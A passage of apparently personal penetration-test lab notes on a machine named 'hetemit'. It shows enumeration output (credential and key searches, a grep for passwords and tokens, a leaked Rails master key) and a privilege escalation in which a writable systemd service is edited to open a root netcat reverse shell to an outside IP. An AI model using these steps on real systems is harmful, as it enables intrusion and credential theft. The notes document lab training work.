/home/cmeeks/.rvm/gems/ruby-2.6.3/gems/byebug-11.1.3/lib/byebug/history.rb
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/gems/2.7.0/gems/rake-13.0.1/lib/rake/thread_history_display.rb
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/reline/history.rb
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/irb/ext/save-history.rb
/home/cmeeks/.rvm/rubies/ruby-2.7.0/lib/ruby/2.7.0/irb/ext/history.rb
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/2.6.0/irb/ext/save-history.rb
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/2.6.0/irb/ext/history.rb
/home/cmeeks/.rvm/rubies/ruby-2.6.3/lib/ruby/gems/2.6.0/gems/rake-12.3.2/lib/rake/thread_history_display.rb
/home/cmeeks/.bash_history
/home/cmeeks/.cache/yarn/v6/npm-caniuse-lite-1.0.30001157-2d11aaeb239b340bc1aa730eca18a37fdb07a9ab-integrity/node_modules/caniuse-lite/data/features/history.js
/home/cmeeks/.cache/yarn/v6/npm-remove-trailing-separator-1.1.0-c24bce2a283adad5bc3f58e0d48249b92379d8ef-integrity/node_modules/remove-trailing-separator/history.md
/home/cmeeks/.cache/yarn/v6/npm-turbolinks-5.2.0-e6877a55ea5c1cb3bb225f0a4ae303d6d32ff77c-integrity/node_modules/turbolinks/src/turbolinks/history.coffee
/home/cmeeks/register_hetemit/node_modules/caniuse-lite/data/features/history.js
/home/cmeeks/register_hetemit/node_modules/remove-trailing-separator/history.md
/home/cmeeks/register_hetemit/node_modules/turbolinks/src/turbolinks/history.coffee

[+] ssh keys in /home
$ find /home -type f \( -name "id_rsa" -o -name "id_*" \) 2>/dev/null
/home/cmeeks/.rvm/gems/ruby-2.7.0/doc/activerecord-6.0.3.4/ri/ActiveRecord/AttributeMethods/PrimaryKey/id_before_type_cast-i.ri
/home/cmeeks/.rvm/gems/ruby-2.7.0/doc/activerecord-6.0.3.4/ri/ActiveRecord/AttributeMethods/PrimaryKey/id_in_database-i.ri
/home/cmeeks/.rvm/gems/ruby-2.7.0/doc/activerecord-6.0.3.4/ri/ActiveRecord/AttributeMethods/PrimaryKey/id_was-i.ri
/home/cmeeks/.rvm/gems/ruby-2.7.0/doc/activerecord-6.0.3.4/ri/ActiveRecord/ConnectionAdapters/Quoting/id_value_for_database-i.ri

[+] sensitive strings in /home (first 50)
$ grep -Ri "password\|passwd\|secret\|token\|key" /home 2>/dev/null | head -n 50
Binary file /home/cmeeks/.gnupg/pubring.kbx~ matches
Binary file /home/cmeeks/.gnupg/pubring.kbx matches
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:  token=${1:-""}
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:  eval "${token}_flag=1"
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:    [[ ${previous_is_format_var:-0} == 1 ]] && eval "${token}_prefix_flag=1"
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:    format="${format}\$${token}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:    format="\$${token}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:add_raw_token()
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:  token=${1:-""}
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:  format="${format:-""}${token}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-prompt:      *)               add_raw_token "$1" ;;
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        log "Trying to install GNU version of tar, might require sudo password"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:            log "Trying to install GNU version of tar, might require sudo password"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:GPG signature verification failed for '$1' - '$3'! Try to install GPG v2 and then fetch the public key:
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:    ${SUDO_USER:+sudo }${rvm_gpg_command##*/} --keyserver hkp://pool.sks-keyservers.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:    token="$1"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:    case "$token" in
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        flags=( -x "${flags[@]}" "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        forwarded_flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        forwarded_flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token=${token#--}
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token=${token//-/_}
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        export "rvm_${token}_flag"=1
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        printf "%b" "Turning on ${token/_/ } mode.\n"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token=${token#--}
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token=${token//-/_}
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        export "rvm_${token}_flag"=1
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        printf "%b" "Turning on ${token/_/ } mode.\n"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:          forwarded_flags+=( "$token" "$1" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        export rvm_autolibs_flag="${token#--autolibs=}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        forwarded_flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        flags+=( "$token" )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        value="${token#*=}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token="${token%%=*}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token="${token#--}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token="${token//-/_}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        export "rvm_${token}"="${value}"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        printf "%b" "Installing RVM ${token/_/ }: ${value}.\n"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        version="$token"
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token=${token#--ruby=}
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        install_rubies+=( ${token//,/ } )
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        token=${token#--gems=}
/home/cmeeks/.rvm/src/rvm/bin/rvm-installer:        install_gems+=( ${token//,/ } )
/home/cmeeks/.rvm/src/rvm/binscripts/rvm-installer:        log "Trying to install GNU version of tar, might require sudo password"
/home/cmeeks/.rvm/src/rvm/binscripts/rvm-installer:            log "Trying to install GNU version of tar, might require sudo password"
/home/cmeeks/.rvm/src/rvm/binscripts/rvm-installer:GPG signature verification failed for '$1' - '$3'! Try to install GPG v2 and then fetch the public key:
/home/cmeeks/.rvm/src/rvm/binscripts/rvm-installer:    ${SUDO_USER:+sudo }${rvm_gpg_command##*/} --keyserver hkp://pool.sks-keyservers.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB

[+] backup files (first 50)
$ find / -name "*.bak" -o -name "*~" 2>/dev/null | head -n 50
/etc/nsswitch.conf.bak
/usr/lib/node_modules/npm/node_modules/copy-concurrently/README.md~
/usr/lib/node_modules/npm/node_modules/form-data/README.md.bak
/usr/lib/node_modules/npm/node_modules/move-concurrently/README.md~
/home/cmeeks/.gnupg/pubring.kbx~
/home/cmeeks/.cache/yarn/v6/npm-console-control-strings-1.1.0-3d7cf4464db6446ea644bf4b39507f9851008e8e-integrity/node_modules/console-control-strings/README.md~
/home/cmeeks/.cache/yarn/v6/npm-form-data-2.3.3-dcce52c05f644f298c6a7ab936bd724ceffbf3a6-integrity/node_modules/form-data/README.md.bak
/home/cmeeks/.cache/yarn/v6/npm-move-concurrently-1.0.1-be2c005fda32e0b29af1f05d7c4b33214c701f92-integrity/node_modules/move-concurrently/README.md~
/home/cmeeks/.cache/yarn/v6/npm-copy-concurrently-1.0.5-92297398cae34937fcafd6ec8139c18051f0b5e0-integrity/node_modules/copy-concurrently/README.md~
/home/cmeeks/.cache/yarn/v6/npm-querystring-0.2.0-b209849203bb25df820da756e747005878521620-integrity/node_modules/querystring/.Readme.md.un~
/home/cmeeks/.cache/yarn/v6/npm-querystring-0.2.0-b209849203bb25df820da756e747005878521620-integrity/node_modules/querystring/.package.json.un~
/home/cmeeks/.cache/yarn/v6/npm-querystring-0.2.0-b209849203bb25df820da756e747005878521620-integrity/node_modules/querystring/.History.md.un~
/home/cmeeks/.cache/yarn/v6/npm-querystring-0.2.0-b209849203bb25df820da756e747005878521620-integrity/node_modules/querystring/test/.index.js.un~
/home/cmeeks/register_hetemit/node_modules/console-control-strings/README.md~
/home/cmeeks/register_hetemit/node_modules/copy-concurrently/README.md~
/home/cmeeks/register_hetemit/node_modules/form-data/README.md.bak
/home/cmeeks/register_hetemit/node_modules/move-concurrently/README.md~
/home/cmeeks/register_hetemit/node_modules/querystring/test/.index.js.un~
/home/cmeeks/register_hetemit/node_modules/querystring/.History.md.un~
/home/cmeeks/register_hetemit/node_modules/querystring/.Readme.md.un~
/home/cmeeks/register_hetemit/node_modules/querystring/.package.json.un~

```

9.  Containers / Virtualization

```
[+] docker env file
$ ls -la /.dockerenv 2>/dev/null

[+] cgroup hints
$ grep -i docker /proc/1/cgroup 2>/dev/null

```

10. Possible PE Paths

```
tcp     LISTEN   0        128            127.0.0.1:5432           0.0.0.0:* 

User cmeeks may run the following commands on hetemit:
    (root) NOPASSWD: /sbin/halt, /sbin/reboot, /sbin/poweroff
    
/home/cmeeks/.rvm/gems/ruby-2.6.3/bin:/home/cmeeks/.rvm/gems/ruby-2.6.3@global/bin:/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin:/home/cmeeks/.local/bin:/home/cmeeks/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/home/cmeeks/.rvm/bin:/home/cmeeks/.rvm/bin

/etc/systemd/system/multi-user.target.wants/pythonapp.service
/etc/systemd/system/pythonapp.service
You have write privileges over /etc/systemd/system/pythonapp.service 
Interesting GROUP writable files (not in Home) (max 200)
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#writable-files                                                                                                                   
  Group cmeeks:                                                                                                                                                                                                                                                                                                                                                                             

/home/cmeeks/.rvm/rubies/ruby-2.6.3/bin/ruby

Analyzing Jenkins Files (limit 70)
-rw------- 1 cmeeks cmeeks 32 Nov 12  2020 /home/cmeeks/register_hetemit/config/master.key                                                                                                                         
13d501513ae570e4d2e50edfa97de275

2020-11-13+21:33:49.6473264950 /var/ftp/shell.py
2020-11-13+21:33:49.6473264950 /var/ftp/run.py
2020-11-13+21:19:51.4573523100 /home/cmeeks/restjson_hetemit/app.py




```

**Privilege Escalation**

1. PE Steps

- Write access on to /etc/systemd/system/pythonapp.service 
- Edited /etc/systemd/system/pythonapp.service 

```
[Unit]
Description=Python App
After=network-online.target

[Service]
Type=simple
WorkingDirectory=/home/cmeeks/restjson_hetemit
ExecStart=nc 192.168.45.151 445 -e /bin/bash
TimeoutSec=30
RestartSec=15s
User=root
ExecReload=/bin/kill -USR1 $MAINPID
Restart=on-failure

[Install]
WantedBy=multi-user.target
```

- Used sudo permission to reboot.

```
sudo reboot
```

- Setup listener using penelope and reeceived reverse shell.

![[Pasted image 20260117192902.png]]
2. Notes

```

```

